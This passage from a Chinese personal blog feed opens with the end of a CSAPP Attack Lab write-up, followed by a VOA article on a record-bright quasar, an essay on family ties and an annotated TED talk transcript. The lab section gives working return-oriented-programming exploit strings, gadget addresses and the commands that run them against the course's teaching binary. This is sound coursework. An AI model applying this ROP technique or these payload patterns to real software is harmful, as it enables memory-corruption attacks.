“no operation”) is encoded by the single byte 0x90. Its only effect is to cause the program counter to be incremented by 1.</p></li></ul><p>Some Advice:</p><ul><li><p>All the gadgets you need can be found in the region of the code for rtarget demarcated by the functions start_farm and mid_farm.</p></li><li><p>You can do this attack with just two gadgets.</p></li><li><p>When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit string will contain a combination of gadget addresses and data.</p></li></ul><p>要求总结:</p><ul><li><p>复现phase_2的操作</p><pre class="line-numbers language-none"><code class="language-none">mov $0x59b997fa, %rdipushq $0x4017ecret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>只需要用only 第一到第八个寄存器(%rax —&gt; %rdi)</p></li><li><p>需要注意0xc3为标志的ret</p></li><li><p>只需要使用两个gadgets</p></li></ul><p>我们知道需要的gadget都存在farm.c中,所以我们先farm.c编译再反汇编得到机器指令+地址,便于寻找,输入以下指令</p><p><strong>一定要注意要输入-Og,不然就会使用stack frame pointer,会变得比较复杂</strong></p><pre class="line-numbers language-none"><code class="language-none">gcc -c -Og farm.cobjdump -d farm.o&gt;farm.s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们便会得到farm.s,我们要做的是把0x59b997fa这个值弄到%rdi里面,但是我们知道我们不能用mov来直接mov立即数,因为farm中没有cookie的值,只能另辟蹊径,把这个cookie的值压入栈中然后再popq</p><p>操作顺序:</p><ul><li><p>转移cookie的值转移到%rdi中</p></li><li><p>把$0x4017ec(touch2地址)压入栈中</p></li><li><p>ret</p></li></ul><p>这是相关联的函数,需要在其中找到gadgets</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000000000 &lt;start_farm&gt;:   0:f3 0f 1e fa          endbr64    4:b8 01 00 00 00       mov    $0x1,%eax   9:c3                   retq   000000000000000a &lt;getval_142&gt;:   a:f3 0f 1e fa          endbr64    e:b8 fb 78 90 90       mov    $0x909078fb,%eax  13:c3                   retq   0000000000000014 &lt;addval_273&gt;:  14:f3 0f 1e fa          endbr64   18:8d 87 48 89 c7 c3    lea    -0x3c3876b8(%rdi),%eax  1e:c3                   retq   000000000000001f &lt;addval_219&gt;:  1f:f3 0f 1e fa          endbr64   23:8d 87 51 73 58 90    lea    -0x6fa78caf(%rdi),%eax  29:c3                   retq   000000000000002a &lt;setval_237&gt;:  2a:f3 0f 1e fa          endbr64   2e:c7 07 48 89 c7 c7    movl   $0xc7c78948,(%rdi)  34:c3                   retq   0000000000000035 &lt;setval_424&gt;:  35:f3 0f 1e fa          endbr64   39:c7 07 54 c2 58 92    movl   $0x9258c254,(%rdi)  3f:c3                   retq   0000000000000040 &lt;setval_470&gt;:  40:f3 0f 1e fa          endbr64   44:c7 07 63 48 8d c7    movl   $0xc78d4863,(%rdi)  4a:c3                   retq   000000000000004b &lt;setval_426&gt;:  4b:f3 0f 1e fa          endbr64   4f:c7 07 48 89 c7 90    movl   $0x90c78948,(%rdi)  55:c3                   retq   0000000000000056 &lt;getval_280&gt;:  56:f3 0f 1e fa          endbr64   5a:b8 29 58 90 c3       mov    $0xc3905829,%eax  5f:c3                   retq   0000000000000060 &lt;mid_farm&gt;:  60:f3 0f 1e fa          endbr64   64:b8 01 00 00 00       mov    $0x1,%eax  69:c3                   retq  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有意识的搜索%rdi这个寄存器相关的机器指令<code>48 89 c7</code>,搜索和%rax有关的<code>58</code>,便注意到这两个函数,<addval_273>和<addval_219>,在rtarget的反汇编中把他找出来(这样能找到地址)</p><pre class="line-numbers language-none"><code class="language-none">00000000004019a0 &lt;addval_273&gt;:  4019a0:8d 87 48 89 c7 c3    lea    -0x3c3876b8(%rdi),%eax  4019a6:c3                   retq   00000000004019a7 &lt;addval_219&gt;:  4019a7:8d 87 51 73 58 90    lea    -0x6fa78caf(%rdi),%eax  4019ad:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当273&gt;函数从0x004019a2开始时,会执行<code>mov %rax,%rdi</code>,<code>ret</code></p><p>当219&gt;函数从0x004019ab开始时,会执行<code>pop %rax</code>,<code>ret</code>.</p><p>这样我们不就可以组合出我们的代码了吗,通过一个一个ret来吧不同的gadget连接在一起</p><p>答案框架如下,</p><pre class="line-numbers language-none"><code class="language-none">---栈底---0x4017ec    &lt;---touch2地址0x4019a2    &lt;--gadget2cookie            #0x59b997fa   &lt;----%rsp 0x4019ab     &lt;---gadget1---栈顶---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编写答案 sol4.txt(注意小端法)</p><pre class="line-numbers language-none"><code class="language-none">00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00ab 19 40 00 00 00 00 00fa 97 b9 59 00 00 00 00a2 19 40 00  00 00 00 00ec 17 40 00 00 00 00 00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入命令</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;hex2raw &lt;sol4.txt &gt;sol4r.txt &amp;&amp; .&#x2F;rtarget -q -i sol4r.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意是要运行rtarget!!!,不要搞错了兄弟们!!!</p><p>若出现以下界面则为成功通关</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220002.png" alt="image-20240302021056405"></p><h2 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase_5"></a>Phase_5</h2><blockquote><p>坚持就是胜利!</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127944.png" alt="image-20240229212126798"></p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127952.png" alt="image-20240229212144522"></p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220043.png" alt="image-20240301232923919" style="zoom:200%;" /><p>我们要通过ROP实现touch3的功能,touch3在phase_3的实现如下</p><pre class="line-numbers language-none"><code class="language-none">push $0x004018falea 0x8(%rsp),%rdiretq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>操作顺序如下:</p><ul><li>把touch3的地址压入栈中</li><li>把cookie的字符串指针地址存入到%rdi寄存器中</li></ul> <pre class="line-numbers language-none"><code class="language-none">35 39 62 39 39 37 66 61 00 # 00 是字符串末尾结束的\0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>地址怎么找?</p><p>这是要重点解决的问题.因为开启了栈的随机化,无法定位字符串精确位置但我们可以通过栈顶的地址+相对地址得到字符串的地址</p><p>如何把准确的地址传送到%rdi寄存器中呢?当然是提前计算好偏移量,然后用一个寄存器承载这个偏移量,再一点一点的把他搬运到%rdi当中啦</p><p>下面是寻找一条完整的通路的全过程(已经将函数从farm中的形式换为了rtarget中的形式,使得地址一目了然),在这里面”—&gt;”表示我倒序寻找通路时思维的前进试探,慢慢打通每一个节点,是寄存器转移顺序的反向,箭头后面表示的是Gadget的起始地址.</p><pre class="line-numbers language-none"><code class="language-none">0000000000401a03 &lt;addval_190&gt;:  401a03:8d 87 41 48 89 e0    lea    -0x1f76b7bf(%rdi),%eax  401a09:c3                   retq    ----- %rsp--&gt;%rax----0x401a06------------00000000004019a0 &lt;addval_273&gt;:  4019a0:8d 87 48 89 c7 c3    lea    -0x3c3876b8(%rdi),%eax  4019a6:c3                   retq     ----%rax--&gt;%rdi----0x4019a2--------  这样子就把%rsp的地址丢到%rdi当中了  执行完getbuf时%rsp&#x3D; 0x5561dca8  字符串应该是存在栈顶+相对位置00000000004019d6 &lt;add_xy&gt;:  4019d6:48 8d 04 37          lea    (%rdi,%rsi,1),%rax  4019da:c3                   retq  ----这个lea能把%rsi作为偏移量,计算好后再返回到%rdi中就好了---0x4019d6所以我们就要想办法往%rsi中丢值,因为找不到pop %rsi的片段,只能从其他地方入手0000000000401a11 &lt;addval_436&gt;:  401a11:8d 87 89 ce 90 90    lea    -0x6f6f3177(%rdi),%eax  401a17:c3                   retq       ---%ecx---&gt;%esi----0x401a13 -----  想试验下78 和c9会不会影响执行程序,不会影响,照样能运行00000000004019e8 &lt;addval_113&gt;:  4019e8:8d 87 89 ce 78 c9    lea    -0x36873177(%rdi),%eax  4019ee:c3                   retq -----0x4019ea------一步步往前找,每找到一个就看一下能不能通过pop得到该值0000000000401a68 &lt;getval_311&gt;:  401a68:b8 89 d1 08 db       mov    $0xdb08d189,%eax  401a6d:c3                   retq   ---%edx---&gt;%ecx---0x401a69----00000000004019db &lt;getval_481&gt;:  4019db:b8 5c 89 c2 90       mov    $0x90c2895c,%eax  4019e0:c3                   retq    ---%edx---&gt;%eax---0x4019dd---  00000000004019ca &lt;getval_280&gt;:  4019ca:b8 29 58 90 c3       mov    $0xc3905829,%eax  4019cf:c3                   retq    ----pop %rax---0x4019cc----  找到了一条通路,所以我们就可以通过pop %rax的值来吧那个偏移量送到%rsi中,最后再把%rdi给更新了就能够定位字符串的位置了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来我们找到每个gadget的location,记得加上一点偏移量来定位到对应的Gadgets开头,然后我们就可以编写答案框架了</p><pre class="line-numbers language-none"><code class="language-none">----栈顶----buf缓冲区,要填0x28个字符movq %rsp--&gt;%rax            &lt;----gadget1    0x401a06   &lt;----%rspmovq %rax---&gt;%rdi           &lt;----gadget2    0x4019a2pop %rax           &lt;----gadget3     0x4019cc相对偏移量  0x48movl %eax---&gt;%edx          &lt;---gadget4      0x4019ddmovl %edx---&gt;%ecx          &lt;---gadget5      0x401a69movl %ecx----&gt;%esi      &lt;---gadget60x401a13lea (%rdi,%rsi,1),%rax     &lt;---gadget7      0x4019d6movl %rax---&gt;%rdi            &lt;----gadget8      0x4019a2$touch3                                &lt;---gadget9        0x004018facookie              &lt;---gadget10       35 39 62 39 39 37 66 61---栈底---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编写sol5.txt文档</p><pre class="line-numbers language-none"><code class="language-none">00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0006 1a 40 00 00 00 00 00a2 19 40 00 00 00 00 00cc 19 40 00 00 00 00 0048 00 00 00 00 00 00 00dd 19 40 00 00 00 00 0069 1a 40 00 00 00 00 0013 1a 40 00 00 00 00 00d6 19 40 00 00 00 00 00a2 19 40 00 00 00 00 00fa 18 40  00 00 00 00 0035 39 62 39 39 37 66 61<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入命令</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;hex2raw &lt;sol5.txt &gt;sol5r.txt &amp;&amp; .&#x2F;rtarget -q -i sol5r.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提交一手,完美通关!!!</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220099.png" alt="image-20240302010809099"></p><p>至此,圆满完成通关!</p><h1 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h1><p>这篇详解是我在第一次做时边做边写的,做完phase_5后又兴致大发开始梳理编写,现在是3月2日的凌晨2:16分,大脑又困又转动.</p><p>实话实说,做这个真的很有意思,虽然我看了不少人的答案,毕竟一开始真的不能理解,不过现在大都理解了,这是一共的文件数量,做完整个lab.</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220164.png" alt="image-20240302021849311"></p><p>希望下一次能够独立做出lab!这才是更大的进步!</p><blockquote><p>Good Luck:生命不止,奋斗不息</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Quasar</title>
      <link href="/2024/02/27/VOA_2/"/>
      <url>/2024/02/27/VOA_2/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.51voa.com/VOA_Special_English/scientists-identify-possibly-brightest-object-in-the-universe-92293.html">MP3</a></p><p><em>By Bryan Lynn</em><br><em>25 February 2024</em></p><p>Astronomers say they may have discovered the brightest object ever observed in the universe.</p><p>The discovery involves a distant space object known as a <strong>quasar</strong><code>an object in space that is similar to a star and that shines very brightly</code>. The American space agency NASA <a href="https://www.nasa.gov/universe/nasas-webb-will-use-quasars-to-unlock-the-secrets-of-the-early-universe/">describes</a> quasars as “very bright, distant and active supermassive black holes that are millions to billions of times the mass of the Sun.”</p><p>A quasar’s light “outshines” all other stars and “its jets and winds shape” its galaxy, NASA adds.</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402270754572.jpeg" alt="This illustration provided by the European Southern Observatory in February 2024, depicts the record-breaking quasar J059-4351. (M. Kornmesser&#x2F;ESO via AP)"><br><strong>This illustration provided by the European Southern Observatory in February 2024, depicts the record-breaking quasar J059-4351. (M. Kornmesser&#x2F;ESO via AP)</strong></p><p>A team led by Australian researchers identified the super bright quasar. The European Southern Observatory’s (ESO’s) Very Large Telescope, based in northern Chile, collected most of the data. Additional data came from Australia’s Siding Spring Observatory.</p><p>The researchers estimate the record-breaking quasar is at least 500 trillion times brighter than our own sun. The team also noted the black hole powering the object is more than 17 billion times larger than our sun.</p><p>The quasar is about 12 billion light years away from Earth. It is thought to have existed since the early days of the universe. A light year is the distance light travels in a year – about 9.5 trillion kilometers.</p><p>The object was already known and had been studied before. But scientists say it was misidentified in the past as a star. The newly identified quasar is so large that its black hole could easily swallow at least one sun per day, the team said.</p><p>The researchers recently reported their finding <a href="https://www.nature.com/articles/s41550-024-02195-x">in a study</a> in the publication <em>Nature Astronomy</em>.</p><p>The quasar appears only as a small dot in images. But scientists say they imagine it to be a very powerful and active place. The team says the black hole is thought to have a circulating <strong>disk</strong> containing gas and other matter from swallowed stars. The disk spins continuously like an intense, active storm.</p><p>“This quasar is the most violent place that we know in the universe,” said the lead writer of the study, Christian Wolf. He is an astronomer and professor in the College of Science at Australian National University.</p><p>The ESO first found the object, known as J0529-4351, in 1980. At the time, it was identified, or classified, as a star. Then last year, it was identified as a quasar.</p><p>The latest observations and computer modeling suggest the quasar is taking in amounts of material equal to about 370 suns a year, or about one per day. The team says more observations will be needed to fully understand the object’s growth rate.</p><p>Priyamvada Natarajan is a professor of astronomy and physics at Yale University. She was not part of the latest study. But Natarajan told the Associated Press, “The exciting thing about this quasar is that it was hiding in plain sight and was misclassified as a star previously.”</p><p>Study co-writer Christopher Onken added, “It is a surprise that it has remained unknown until today, when we already know about a million less <strong>impressive</strong> quasars.”</p><p>The researchers say finding and studying distant supermassive black holes could help astronomers learn important details about the birth and development of the early universe. But study leader Wolf noted that he also gets enjoyment out of the search itself.</p><p>“Personally, I simply like the chase,” he <a href="https://www.eso.org/public/news/eso2402/">said</a> in a statement. “For a few minutes a day, I get to feel like a child again, playing treasure hunt. And now, I bring everything to the table that I have learned since.”</p><p>Future research is expected to center on the history of the quasar and measuring its growth and development. The team noted that some of this data should be easier to collect after the Very Large Telescope receives an instrument <strong>upgrade</strong>. The upgrade, known as Gravity+, is designed to provide more exact measurements of the mass of distant black holes.</p><p>In addition, the ESO plans to launch a future observer, called the Extremely Large Telescope (ELT), in Chile’s Atacama Desert. That telescope, the researchers say, will improve on current identification and study methods to identify such distant objects.</p><p align="right">I'm Bryan Lynn</p><p align="right">Edit by Vite</p><p><em>Bryan Lynn wrote this story for VOA Learning English, based on reports from The Associated Press and the European Southern Observatory.</em></p><p><strong>—————–</strong></p><h2 id="Words-in-This-Story"><a href="#Words-in-This-Story" class="headerlink" title="Words in This Story"></a>Words in This Story</h2><p><strong>disk</strong> <em>– n.</em> a flat, round object</p><p><strong>impressive</strong> <em>– adj.</em> something considered noteworthy or causing admiration or respect</p><p><strong>upgrade</strong> <em>– n.</em> to improve something that is higher quality of a newer model</p>]]></content>
      
      
      <categories>
          
          <category> VOA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> VOA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人际关系</title>
      <link href="/2024/02/14/human/"/>
      <url>/2024/02/14/human/</url>
      
        <content type="html"><![CDATA[<blockquote><p>人是社会性的动物,总需要群体的生活,自古以来都是这样,只不过是从一群大猩猩”进化”成为一群占地为王,占山为王,掠夺经济,资源,的新人类罢了,站上了食物链的顶端.对于社会的联系也在加强,联系的方式也在变化.</p></blockquote><h1 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h1><p>近几日过年自然走访亲戚,19,20岁的我还是何14,5岁没啥区别,认不清人,包括且不限于四五个姑姑,堂姐,表格,叔叔,伯伯,舅公.感觉他们之所以在年轻时能发展处如此紧密的关系网,主要是以地缘关系为桥梁,以血缘关系为紧密的纽带而联系起来,毕竟一个邻居家的爷爷就有三个儿子,每个儿子又有儿女开枝散叶,便形成了如此恐怖的关系网,我反正没理明白.</p><p>然后我便意识到,每个人都逃不掉走亲访友的局面<del>也可能有例外</del>,为了在几十年后我年老后或者说当我要作为主事人去发红包时,我应该要认得大家,于是我可以的留意了同辈,这是比较好接触的,至目前为止(初六),也算是结束过年,准备回广州</p><h1 id="终止-00后"><a href="#终止-00后" class="headerlink" title="终止?00后?"></a>终止?00后?</h1><p>会想,走亲访友这个习俗会不会在00后这里终结?</p><blockquote><p>个体更倾向于信任那些经常出现在自己生活中的人，常年不见的亲戚因时空疏离，又因城市化分工带来的差异，让价值观、态度立场难以重合，以至于“无法深聊”“共同话题不多”。</p><p align="right">摘自<<澎湃新闻网>></p></blockquote><p>熟悉的陌生人,地缘关系的隔离,因为父母而继承的关系私以为都会在这个网络快速发展之中被不在重视,不在特殊化,年轻一代因为网络能认识到更志同道合的朋友,但因父母而继承的关系能有共同话题的年轻一辈真是太少了,自然会以许多借口缘由而放弃社交,因为社交本身就是一件交易,付出你的价值,换取合理的利益,当交易双方不对等时,做不到一味的付出也就造成了交易的终止.</p><p>当然也不否认一种可能,就是多年后当年轻一辈变成了老一辈,可能会继承老一辈的思想,可能也会无聊,在不常生活的家乡去找寻昔日的年轻一辈主动进行社交,来抵消自己内心中的空虚和对过年走亲访友的一些道德感.</p><h1 id="传承"><a href="#传承" class="headerlink" title="传承?"></a>传承?</h1><p>以前的社会关系,社会环境恶劣,养育后代是为了家族的传承接替,需要时刻保证有壮丁能为了一整个部落抛头颅洒热血.但现在呢?似乎已经发生了根本性变化,平静的,发展的世界已经形成了太久太久,其实也没有很久,只需要两三代就可以淡掉一点战争的痛苦,抱着满怀的希望和信心开展新的生活.在平静的时代,传宗接代,血缘关系淡化,部分人开始思考多元的性,彩虹游行时长发生,可以预见,在没有外部压迫,对传承没有什么需求了,或者说哲学的进步,更多的人开始更加独立,思考的更为全面,有人是想摆烂,有人是就像<code>何以为家</code>中的那样不想让孩子生下来一起受罪.思想在当代更为跃动,颠覆了百年前,千年前的封建传统.</p><p>当然也不妨有一个猜测,个人的传承会被集体的传承所替代,有社会统一安排进行生育,以人造子宫,社会抚养中心的方式,中心化传承,不必做到像氪星人那样出生决定一切,那太逻辑了,违背了人性.如此的传承应该是会有更高的效率,更高的上限,或者说是一种容错方式</p><blockquote><p>以上内容纯属无稽之谈</p></blockquote><h3 id="Good-Luck"><a href="#Good-Luck" class="headerlink" title="Good Luck"></a>Good Luck</h3><blockquote><p>愿汝之体恒满精力，愿汝之心恒葆青春。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PASTFUTURE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思考 </tag>
            
            <tag> 镜花水月 </tag>
            
            <tag> 交往 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>how to speak详解</title>
      <link href="/2024/02/01/TED_2/"/>
      <url>/2024/02/01/TED_2/</url>
      
        <content type="html"><![CDATA[<h1 id="How-to-speak-so-that-people-want-to-listen"><a href="#How-to-speak-so-that-people-want-to-listen" class="headerlink" title="How to speak so that people want to listen"></a>How to speak so that people want to listen</h1><p><em><strong>Julian Treasure |TED Global 2013 |June 2013</strong></em></p><blockquote><p><strong><a href="https://www.bilibili.com/video/BV1Qe4y1B7E7/?spm_id_from=333.999.0.0&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">Speaking Video</a></strong></p></blockquote><p><a href="https://pic.imgdb.cn/item/65826028c458853aefbc80d0.png"><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071320041.png"></a></p><p>The human voice: It’s the instrument we all play. It’s the most powerful sound in the world, probably. It’s the only one that can start a war or say “I love you.” And yet many people have the experience that when they speak, people don’t listen to them. And why is that? How can we speak powerfully to make change in the world?What I’d like to suggest, there are a number of habits that we need to move away from. I’ve assembled for your pleasure here seven deadly sins of speaking.(说话的七宗罪) I’m not pretending this is an exhaustive(详细的) list, but these seven, I think, are pretty large habits that we can all fall into.（容易犯）     </p><h2 id="seven-deadly-sins-of-speaking"><a href="#seven-deadly-sins-of-speaking" class="headerlink" title="seven deadly sins of speaking"></a>seven deadly sins of speaking</h2><h3 id="gossip"><a href="#gossip" class="headerlink" title="gossip"></a>gossip</h3><p>First, gossip(流言，闲言碎语）. Speaking ill of somebody who’s not present. Not a nice habit, and we know perfectly well the person gossiping, five minutes later, will be gossiping about us.</p><h3 id="judging"><a href="#judging" class="headerlink" title="judging"></a>judging</h3><p>Second, judging. We know people who are like this in conversation, and it’s very hard to listen to somebody if you know that you’re being judged and found wanting(不合格,有欠缺的) at the same time.</p><h3 id="negativity"><a href="#negativity" class="headerlink" title="negativity"></a>negativity</h3><p>Third, negativity. You can fall into this. My mother, in the last years of her life, became very negative, and it’s hard to listen. I remember one day, I said to her, “It’s October 1 today,” and she said, “I know, isn’t it dreadful( <strong>extremely unpleasant</strong>)?”</p><p>(Laughter)</p><p>It’s hard to listen when somebody’s that negative.</p><p>(Laughter)</p><h3 id="complaining"><a href="#complaining" class="headerlink" title="complaining"></a>complaining</h3><p>And another form of negativity, complaining. Well, this is the national art of the UK. It’s our national sport. We complain about the weather, sport, about politics, about everything, but actually, complaining is viral（病毒性的） misery.（痛苦） It’s not spreading sunshine and lightness in the world.</p><h3 id="excuses"><a href="#excuses" class="headerlink" title="excuses"></a>excuses</h3><p> Excuses. We’ve all met this guy（坏蛋）. Maybe we’ve all been this guy. Some people have a blame thrower（指责癖好）. They just pass it on to everybody else  and don’t take responsibility for their actions, and again, hard to listen to somebody who is being like that. </p><h3 id="lying"><a href="#lying" class="headerlink" title="lying"></a>lying</h3><p>Penultimate（倒数第二的）, the sixth of the seven, embroidery,(刺绣&#x2F;夸张之间，渲染) exaggeration（吹牛，浮夸）. It demeans（贬低） our language, actually, sometimes. For example, if I see something that really is awesome, what do I call it?</p><p>(Laughter)</p><p>And then, of course, this exaggeration becomes lying, and we don’t want to listen to people we know are lying to us.</p><h3 id="dogmatism-固执己见"><a href="#dogmatism-固执己见" class="headerlink" title="dogmatism(固执己见)"></a>dogmatism(固执己见)</h3><p> And finally, dogmatism. The confusion of facts with opinions. When those two things get conflated, you’re listening into the wind. You know, somebody is bombarding（轰炸） you with their opinions as if they were true. It’s difficult to listen to that.So here they are, seven deadly sins of speaking. These are things I think we need to avoid. </p><p> But is there a positive way to think about this? Yes, there is. I’d like to suggest that there are four really powerful cornerstones, foundations, that we can stand on if we want our speech to be powerful and to make change in the world. </p><h2 id="HAIL"><a href="#HAIL" class="headerlink" title="HAIL"></a>HAIL</h2><p>Fortunately, these things spell a word. The word is “hail,” and it has a great definition as well. I’m not talking about the stuff that falls from the sky and hits you on the head. I’m talking about this definition, <strong>to greet or acclaim enthusiastically</strong>, which is how I think our words will be received if we stand on these four things.So what do they stand for? See if you can guess. </p><p>The H, honesty, of course, being true in what you say, being straight and clear. The A is authenticity,  just being yourself. A friend of mine described it as standing in your own truth, which I think is a lovely way to put it. The I is integrity(一身正气）, being your word, actually doing what you say, and being somebody people can trust. And the L is love. I don’t mean romantic love, but I do mean wishing people well, for two reasons. </p><p> First of all, I think absolute honesty may not be what we want. I mean, my goodness, you look ugly this morning. Perhaps that’s not necessary. Tempered with love（适当的带着爱）, of course, honesty is a great thing. But also, if you’re really wishing somebody well, it’s very hard to judge them at the same time. I’m not even sure you can do those two things simultaneously（同时地）. So hail.Also, now that’s what you say, and it’s like the old song, it is what you say, it’s also the way that you say it. You have an amazing toolbox. This instrument is incredible, and yet this is a toolbox that very few people have ever opened. I’d like to have a little rummage（翻找，调查） in there with you now and just pull a few tools out that you might like to take away and play with, which will increase the power of your speaking.</p><h2 id="Some-tools"><a href="#Some-tools" class="headerlink" title="Some tools"></a>Some tools</h2><h3 id="register（音域）"><a href="#register（音域）" class="headerlink" title="register（音域）"></a>register（音域）</h3><p> Register, for example. Now, falsetto register（假声） may not b e very useful most of the time, but there’s a register in between.  I’m not going to get very technical about this for any of you who are voice coaches. You can locate your voice, however. So if I talk up here in my nose, you can hear the difference. If I go down here in my throat, which is where most of us speak from most of the time. But if you want weight, you need to go down here to the chest. You hear the difference? We vote for politicians with lower voices, it’s true, because we associate depth with power and with authority. That’s register.</p><h3 id="timbre（音色）"><a href="#timbre（音色）" class="headerlink" title="timbre（音色）"></a>timbre（音色）</h3><p>Then we have timbre. It’s the way your voice feels. Again, the research shows that we prefer voices which are rich, smooth, warm, like hot chocolate. Well if that’s not you, that’s not the end of the world, because you can train. Go and get a voice coach. And there are amazing things you can do with breathing, with posture（姿势） , and with exercises to improve the timbre of your voice.</p><h3 id="prosody"><a href="#prosody" class="headerlink" title="prosody"></a>prosody</h3><p>Then prosody（韵律）. I love prosody. This is the sing-song, the meta-language that we use in order to impart(传达传授，透露) meaning. It’s root one for meaning in conversation. People who speak all on one note are really quite hard to listen to if they don’t have any prosody at all. That’s where the word “monotonic（没有起伏，单调） “ comes from, or monotonous, monotone. Also, we have repetitive prosody now coming in, where every sentence ends as if it were a question when it’s actually not a question, it’s a statement? </p><p>(Laughter)</p><p>And if you repeat that one, it’s actually restricting your ability to communicate through prosody, which I think is a shame, so let’s try and break that habit. </p><h3 id="pace"><a href="#pace" class="headerlink" title="pace"></a>pace</h3><p>Pace. I can get very excited by saying something really quickly, or I can slow right down to emphasize, and at the end of that, of course, is our old friend silence. There’s nothing wrong with a bit of silence in a talk, is there? We don’t have to fill it with ums and ahs. It can be very powerful.</p><h3 id="pitch-音高"><a href="#pitch-音高" class="headerlink" title="pitch(音高)"></a>pitch(音高)</h3><p>Of course, pitch often goes along with pace to indicate arousal（激动，兴奋）, but you can do it just with pitch. Where did you leave my keys? (Higher pitch) Where did you leave my keys? So, slightly different meaning in those two deliveries. </p><h3 id="volume"><a href="#volume" class="headerlink" title="volume"></a>volume</h3><p>And finally, volume. (Loud) I can get really excited by using volume. Sorry about that, if I startled(打扰受惊，使吃惊) anybody. Or, I can have you really pay attention by getting very quiet. Some people broadcast the whole time. Try not to do that. That’s called sodcasting（公放音乐）,</p><p>(Laughter)</p><p>Imposing（impose强制实行） your sound on people around you carelessly and inconsiderately. Not nice.Of course, where this all comes into play most of all is when you’ve got something really important to do. It might be standing on a stage like this and giving a talk to people. It might be proposing marriage（求婚）, asking for a raise, a wedding speech. Whatever it is, if it’s really important, you owe it to yourself to look at this toolbox and the engine that it’s going to work on, and no engine works well without being warmed up. Warm up your voice.Actually, let me show you how to do that. </p><h3 id="the-way-to-warm-up"><a href="#the-way-to-warm-up" class="headerlink" title="the way to warm up"></a>the way to warm up</h3><p>Would you all like to stand up for a moment? I’m going to show you the six vocal warm-up exercises that I do before every talk I ever do. Any time you’re going to talk to anybody important, do these. </p><p>First, arms up, deep breath in, and sigh out, ahhhhh, like that. One more time. Ahhhh, very good. Now we’re going to warm up our lips, and we’re going to go Ba, Ba, Ba, Ba, Ba, Ba, Ba, Ba. Very good. And now, brrrrrrrrrr, just like when you were a kid. Now your lips should be coming alive. We’re going to do the tongue next with exaggerated(夸张) la, la, la, la, la, la, la, la, la. Beautiful. You’re getting really good at this. And then, roll an R. Rrrrrrr. That’s like champagne（香槟酒） for the tongue. Finally, and if I can only do one, the pros（老手，运动员） call this the <strong>siren</strong>（警报器）. It’s really good. It starts with “we” and goes to “aw.” The “we” is high, the “aw” is low. So you go, weeeaawww, weeeaa<a href="http://www.fantastic/">www.Fantastic</a>. Give yourselves a round of applause. Take a seat, thank you.</p><p>(Applause)</p><h2 id="Conclude"><a href="#Conclude" class="headerlink" 